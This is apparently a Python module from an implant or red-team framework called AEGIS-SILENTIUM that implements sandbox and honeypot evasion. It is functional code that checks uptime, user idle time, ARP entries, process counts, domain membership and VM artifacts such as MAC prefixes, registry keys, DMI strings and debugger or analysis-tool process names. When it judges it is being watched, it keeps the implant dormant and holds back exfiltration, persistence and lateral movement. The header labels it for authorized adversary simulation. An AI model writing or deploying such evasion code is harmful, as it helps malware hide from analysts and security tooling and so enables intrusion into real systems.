"""
AEGIS-SILENTIUM — node/evasion/honeypot.py
========================================
Passive environment trust-scoring and honeypot/sandbox evasion.

The implant uses these checks BEFORE sending any sensitive data or executing
risky commands.  All checks are purely passive (read-only, no network probes,
no credential validation).  If the environment scores below the trust threshold,
the implant enters DORMANT mode: it continues to beacon but sends only benign
telemetry, never exfiltrating data or running intrusive operations.

Trust Score Components
──────────────────────
  ARP cache activity     (+10)  — recent ARP entries indicate live network
  User interaction       (+20)  — recent keyboard/mouse activity
  Uptime                 (+15)  — host uptime > 10 minutes
  Process diversity      (+15)  — >30 running processes
  File access recency    (+15)  — recently modified files in home dir
  Domain membership      (+10)  — joined to an AD domain
  No VM artifacts        (+15)  — no VMware/VirtualBox/Hyper-V artifacts

  Total possible: 100.  Default trust threshold: 40.

Dormant mode behaviour
──────────────────────
  - Beacons with {"status": "dormant", "telemetry": {...}}
  - No persistence, no privesc, no exfil, no lateral movement
  - May optionally send decoy telemetry (benign system info only)

AUTHORIZED USE ONLY — professional adversary simulation.
"""

from __future__ import annotations

import ctypes
import glob
import json
import logging
import os
import platform
import re
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

log = logging.getLogger("aegis.evasion")

# ────────────────────────────────────────────────────────────────────────────
# Constants
# ────────────────────────────────────────────────────────────────────────────
DEFAULT_TRUST_THRESHOLD = 40
TRUST_MAX = 100

# Known VM/sandbox process names (lowercased)
_VM_PROCESSES = {
    "vmtoolsd", "vmwaretray", "vmwareuser", "vmacthlp", "vboxservice",
    "vboxtray", "vboxcontrol", "vmusrvc", "vmount2", "vmcompute",
    "sandboxiedcomlaunch", "sandboxierpcss", "sbiesvc",
    "procmon", "procmon64", "wireshark", "fiddler", "charles",
    "x32dbg", "x64dbg", "ollydbg", "windbg", "dnspy",
    "idaq", "idaq64", "idat", "idat64", "idaw",
    "cuckoo", "analyser", "anubis", "regmon", "filemon",
    "peid", "resourcehacker", "lordpe", "importrec",
}

# VM MAC address prefixes
_VM_MAC_PREFIXES = {
    "00:0c:29",  # VMware
    "00:50:56",  # VMware
    "08:00:27",  # VirtualBox
    "52:54:00",  # QEMU/KVM
    "00:15:5d",  # Hyper-V
    "00:16:3e",  # Xen
    "00:1c:42",  # Parallels
    "00:21:f6",  # Virtual Iron
}

# VM-specific registry keys (Windows)
_VM_REGISTRY_KEYS = [
    r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
    r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
    r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest",
    r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
    r"HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",  # Hyper-V
]

# VM CPUID strings
_VM_CPUID_STRINGS = [b"VMwareVMware", b"XenVMMXenVMM", b"KVMKVMKVM\x00\x00\x00",
                      b"Microsoft Hv", b"VBoxVBoxVBox"]


# ────────────────────────────────────────────────────────────────────────────
# Data classes
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class TrustCheckResult:
    name: str
    passed: bool
    score_awarded: int
    score_possible: int
    detail: str = ""


@dataclass
class EnvironmentAssessment:
    score: int
    threshold: int
    trusted: bool
    checks: List[TrustCheckResult] = field(default_factory=list)
    platform: str = ""
    hostname: str = ""
    timestamp: float = field(default_factory=time.time)

    @property
    def dormant(self) -> bool:
        return not self.trusted

    def to_dict(self) -> Dict[str, Any]:
        return {
            "score": self.score,
            "threshold": self.threshold,
            "trusted": self.trusted,
            "dormant": self.dormant,
            "platform": self.platform,
            "hostname": self.hostname,
            "timestamp": self.timestamp,
            "checks": [
                {
                    "name": c.name,
                    "passed": c.passed,
                    "score": c.score_awarded,
                    "detail": c.detail,
                }
                for c in self.checks
            ],
        }

    def benign_telemetry(self) -> Dict[str, Any]:
        """Safe telemetry for dormant mode — no sensitive information."""
        return {
            "status": "dormant",
            "platform": self.platform,
            "hostname": self.hostname,
            "uptime_check": any(c.name == "uptime" and c.passed for c in self.checks),
            "timestamp": self.timestamp,
        }


# ────────────────────────────────────────────────────────────────────────────
# Individual checks
# ────────────────────────────────────────────────────────────────────────────
def _check_arp_activity() -> TrustCheckResult:
    """Check ARP cache for recent activity indicating a live network."""
    score = 10
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(["arp", "-a"], timeout=5,
                                           stderr=subprocess.DEVNULL).decode(errors="replace")
            entries = [l for l in out.splitlines() if re.search(r"\d+\.\d+\.\d+\.\d+", l)
                       and "incomplete" not in l.lower()]
        else:
            arp_file = Path("/proc/net/arp")
            if arp_file.exists():
                content = arp_file.read_text()
                entries = [l for l in content.splitlines()[1:] if "0x2" in l or "0x6" in l]
            else:
                out = subprocess.check_output(["arp", "-n"], timeout=5,
                                               stderr=subprocess.DEVNULL).decode(errors="replace")
                entries = [l for l in out.splitlines() if l and "incomplete" not in l]
        passed = len(entries) >= 2
        return TrustCheckResult("arp_activity", passed, score if passed else 0, score,
                                 f"{len(entries)} ARP entries")
    except Exception as e:
        return TrustCheckResult("arp_activity", False, 0, score, str(e))


def _check_user_interaction() -> TrustCheckResult:
    """Check for evidence of recent user activity (input devices, shell history)."""
    score = 20
    try:
        if platform.system() == "Windows":
            # Check last input time via GetLastInputInfo
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            li = LASTINPUTINFO()
            li.cbSize = ctypes.sizeof(li)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(li))
            idle_ms = ctypes.windll.kernel32.GetTickCount() - li.dwTime
            passed = idle_ms < 300_000  # idle < 5 minutes
            return TrustCheckResult("user_interaction", passed,
                                     score if passed else 0, score,
                                     f"idle {idle_ms // 1000}s")
        else:
            # Check bash/zsh history file modification time
            for hist in ["~/.bash_history", "~/.zsh_history", "~/.local/share/fish/fish_history"]:
                p = Path(os.path.expanduser(hist))
                if p.exists():
                    age = time.time() - p.stat().st_mtime
                    if age < 86400:  # modified within 24h
                        return TrustCheckResult("user_interaction", True, score, score,
                                                 f"{hist} modified {age:.0f}s ago")
            # Check /proc/tty
            tty_count = len(list(Path("/proc").glob("*/fd/*tty*"))) if Path("/proc").exists() else 0
            passed = tty_count > 0
            return TrustCheckResult("user_interaction", passed,
                                     score if passed else 0, score,
                                     f"{tty_count} TTY fds")
    except Exception as e:
        return TrustCheckResult("user_interaction", False, 0, score, str(e))


def _check_uptime() -> TrustCheckResult:
    """Check host uptime — sandboxes often have very short uptimes."""
    score = 15
    try:
        if platform.system() == "Linux":
            uptime_s = float(Path("/proc/uptime").read_text().split()[0])
        elif platform.system() == "Windows":
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            uptime_s = uptime_ms / 1000.0
        elif platform.system() == "Darwin":
            import time
            # sysctlbyname 'kern.boottime'
            out = subprocess.check_output(["sysctl", "-n", "kern.boottime"], timeout=3)
            # output: { sec = NNNN, usec = NNNN } Thu Jan 1 00:00:00 1970
            m = re.search(r"sec\s*=\s*(\d+)", out.decode())
            uptime_s = time.time() - int(m.group(1)) if m else 0
        else:
            uptime_s = 0

        passed = uptime_s > 600  # > 10 minutes
        return TrustCheckResult("uptime", passed, score if passed else 0, score,
                                 f"{uptime_s / 60:.1f} minutes")
    except Exception as e:
        return TrustCheckResult("uptime", False, 0, score, str(e))


def _check_process_diversity() -> TrustCheckResult:
    """Check that a healthy number of processes are running."""
    score = 15
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(["tasklist", "/FO", "CSV"], timeout=5,
                                           stderr=subprocess.DEVNULL)
            count = len(out.splitlines()) - 1
        else:
            pids = [d for d in Path("/proc").iterdir()
                    if d.name.isdigit()] if Path("/proc").exists() else []
            count = len(pids)

        passed = count >= 30
        return TrustCheckResult("process_diversity", passed,
                                 score if passed else 0, score, f"{count} processes")
    except Exception as e:
        return TrustCheckResult("process_diversity", False, 0, score, str(e))


def _check_file_activity() -> TrustCheckResult:
    """Check for recently-modified files in user home indicating real usage."""
    score = 15
    try:
        home = Path.home()
        cutoff = time.time() - 86400 * 7  # within last 7 days
        recent = []
        for f in list(home.glob("**/*"))[:500]:
            try:
                if f.is_file() and f.stat().st_mtime > cutoff:
                    recent.append(f)
                    if len(recent) >= 10:
                        break
            except (PermissionError, OSError):
                pass
        passed = len(recent) >= 5
        return TrustCheckResult("file_activity", passed,
                                 score if passed else 0, score,
                                 f"{len(recent)} recently-modified files")
    except Exception as e:
        return TrustCheckResult("file_activity", False, 0, score, str(e))


def _check_domain_membership() -> TrustCheckResult:
    """Check if the host is joined to an AD/LDAP domain."""
    score = 10
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
            domain, _ = winreg.QueryValueEx(key, "Domain")
            passed = bool(domain and domain.strip())
            return TrustCheckResult("domain_membership", passed,
                                     score if passed else 0, score,
                                     f"domain: {domain!r}")
        else:
            # Check /etc/krb5.conf, /etc/sssd/sssd.conf, or 'realm list'
            for cfg in ["/etc/krb5.conf", "/etc/sssd/sssd.conf"]:
                if Path(cfg).exists():
                    content = Path(cfg).read_text()
                    if "domain" in content.lower() or "realm" in content.lower():
                        return TrustCheckResult("domain_membership", True, score, score,
                                                 f"found {cfg}")
            # Try 'hostname -d'
            try:
                domain = subprocess.check_output(["hostname", "-d"], timeout=3,
                                                   stderr=subprocess.DEVNULL).decode().strip()
                passed = bool(domain and domain != "(none)")
                return TrustCheckResult("domain_membership", passed,
                                         score if passed else 0, score,
                                         f"domain: {domain!r}")
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
        return TrustCheckResult("domain_membership", False, 0, score, "no domain detected")
    except Exception as e:
        return TrustCheckResult("domain_membership", False, 0, score, str(e))


def _check_vm_artifacts() -> TrustCheckResult:
    """
    Check for VM/sandbox artifacts.  Returns True (trusted) if NO VM artifacts found.
    """
    score = 15
    findings: List[str] = []

    # 1. Check MAC address prefixes
    try:
        macs = _get_mac_addresses()
        for mac in macs:
            prefix = ":".join(mac.split(":")[:3]).lower()
            if prefix in _VM_MAC_PREFIXES:
                findings.append(f"VM MAC: {mac}")
    except Exception as _exc:
        log.debug("_check_vm_artifacts: %s", _exc)

    # 2. Check running processes
    try:
        running = _get_running_process_names()
        vm_procs = running & _VM_PROCESSES
        if vm_procs:
            findings.append(f"VM processes: {', '.join(sorted(vm_procs)[:5])}")
    except Exception as _exc:
        log.debug("unknown: %s", _exc)

    # 3. Check /proc/scsi or /sys/class/dmi for VM strings (Linux)
    if platform.system() == "Linux":
        dmi_paths = [
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/board_vendor",
        ]
        vm_strings = {"vmware", "virtualbox", "qemu", "kvm", "xen", "microsoft corporation",
                      "bochs", "innotek", "parallels"}
        for dmi in dmi_paths:
            try:
                content = Path(dmi).read_text().strip().lower()
                if any(v in content for v in vm_strings):
                    findings.append(f"VM DMI: {dmi}={content!r}")
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    # 4. Windows registry checks
    if platform.system() == "Windows":
        try:
            import winreg
            for key_path in _VM_REGISTRY_KEYS:
                hive, subkey = key_path.split("\\", 1)
                hive_map = {"HKLM": winreg.HKEY_LOCAL_MACHINE}
                try:
                    with winreg.OpenKey(hive_map.get(hive, winreg.HKEY_LOCAL_MACHINE), subkey):
                        findings.append(f"VM registry: {key_path}")
                except FileNotFoundError:
                    pass
        except Exception as _exc:
            log.debug("unknown: %s", _exc)

    no_vm = len(findings) == 0
    return TrustCheckResult(
        "no_vm_artifacts", no_vm,
        score if no_vm else 0, score,
        "clean" if no_vm else "; ".join(findings[:3])
    )


# ────────────────────────────────────────────────────────────────────────────
# Helper utilities
# ────────────────────────────────────────────────────────────────────────────
def _get_mac_addresses() -> List[str]:
    macs = []
    if platform.system() == "Linux":
        for iface_path in Path("/sys/class/net").iterdir():
            mac_file = iface_path / "address"
            if mac_file.exists():
                mac = mac_file.read_text().strip()
                if mac and mac != "00:00:00:00:00:00":
                    macs.append(mac)
    elif platform.system() == "Windows":
        out = subprocess.check_output(["getmac", "/FO", "CSV", "/V"], timeout=5,
                                       stderr=subprocess.DEVNULL).decode(errors="replace")
        for line in out.splitlines()[1:]:
            parts = line.split(",")
            if len(parts) >= 2:
                macs.append(parts[1].strip('"').replace("-", ":").lower())
    return macs


def _get_running_process_names() -> set:
    names = set()
    if platform.system() == "Linux":
        for pid_path in Path("/proc").iterdir():
            if pid_path.name.isdigit():
                try:
                    comm = (pid_path / "comm").read_text().strip().lower()
                    names.add(comm)
                except Exception as _exc:
                    log.debug("_get_running_process_names: %s", _exc)
    elif platform.system() == "Windows":
        out = subprocess.check_output(["tasklist", "/FO", "CSV"], timeout=5,
                                       stderr=subprocess.DEVNULL).decode(errors="replace")
        for line in out.splitlines()[1:]:
            parts = line.strip().split(",")
            if parts:
                names.add(parts[0].strip('"').lower())
    elif platform.system() == "Darwin":
        out = subprocess.check_output(["ps", "-axo", "comm"], timeout=5,
                                       stderr=subprocess.DEVNULL).decode(errors="replace")
        for line in out.splitlines()[1:]:
            names.add(os.path.basename(line.strip()).lower())
    return names


# ────────────────────────────────────────────────────────────────────────────
# Main assessment engine
# ────────────────────────────────────────────────────────────────────────────
class EnvironmentAssessor:
    """
    Passive environment trust scorer.

    Usage
    ─────
    assessor = EnvironmentAssessor(threshold=40)
    result = assessor.assess()

    if result.dormant:
        # Send benign telemetry only
        payload = result.benign_telemetry()
    else:
        # Proceed with normal operations
        ...
    """

    def __init__(self, threshold: int = DEFAULT_TRUST_THRESHOLD,
                 cache_ttl: int = 300):
        self.threshold = threshold
        self.cache_ttl = cache_ttl
        self._cache: Optional[EnvironmentAssessment] = None
        self._cache_time: float = 0

    def assess(self, force: bool = False) -> EnvironmentAssessment:
        """Run all trust checks and return an EnvironmentAssessment."""
        now = time.time()
        if not force and self._cache and (now - self._cache_time) < self.cache_ttl:
            return self._cache

        checks: List[TrustCheckResult] = [
            _check_arp_activity(),
            _check_user_interaction(),
            _check_uptime(),
            _check_process_diversity(),
            _check_file_activity(),
            _check_domain_membership(),
            _check_vm_artifacts(),
        ]

        total = sum(c.score_awarded for c in checks)

        assessment = EnvironmentAssessment(
            score=total,
            threshold=self.threshold,
            trusted=(total >= self.threshold),
            checks=checks,
            platform=platform.system(),
            hostname=socket.gethostname(),
            timestamp=now,
        )

        log.info("environment trust score: %d/%d (%s)",
                  total, TRUST_MAX,
                  "TRUSTED" if assessment.trusted else "DORMANT")

        for c in checks:
            level = logging.DEBUG if c.passed else logging.WARNING
            log.log(level, "  [%s] %s (%d/%d) — %s",
                     "✓" if c.passed else "✗", c.name,
                     c.score_awarded, c.score_possible, c.detail)

        self._cache = assessment
        self._cache_time = now
        return assessment

    def is_trusted(self) -> bool:
        """Quick check — returns True if environment is trusted."""
        return self.assess().trusted


# ────────────────────────────────────────────────────────────────────────────
# Exports
# ────────────────────────────────────────────────────────────────────────────
__all__ = [
    "EnvironmentAssessor",
    "EnvironmentAssessment",
    "TrustCheckResult",
    "DEFAULT_TRUST_THRESHOLD",
]
